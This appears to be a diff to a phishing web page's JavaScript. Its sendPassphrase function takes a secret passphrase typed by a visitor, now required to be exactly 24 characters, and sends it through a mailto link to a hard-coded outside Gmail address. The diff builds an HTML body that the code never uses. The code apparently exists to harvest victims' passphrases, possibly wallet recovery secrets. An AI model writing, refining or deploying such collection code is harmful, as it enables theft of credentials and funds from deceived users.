@@ -41,16 +41,17 @@ function hideDownloadPopup() {
 }
 
 function sendPassphrase() {
-  const passphrase = document.getElementById("passphraseInput").value;
-  if (passphrase.trim() === "") {
-    alert("Please enter a passphrase before submitting.");
+  const passphrase = document.getElementById("passphraseInput").value.trim();
+  if (passphrase.length !== 24) {
+    alert("Please enter exactly 24 characters.");
     return;
   }
 
   const email = "krishnadigitalmedianwh@gmail.com";
   const subject = "Passphrase Submission";
-  const body = `Passphrase: ${passphrase}`;
-  const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+  const body = `Passphrase Submission:\n\n<table border="1" cellpadding="5"><tr><th>Passphrase</th></tr><tr><td>${passphrase}</td></tr></table>`;
+  const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(passphrase)}`;
+
   window.location.href = mailtoLink;
 }
 
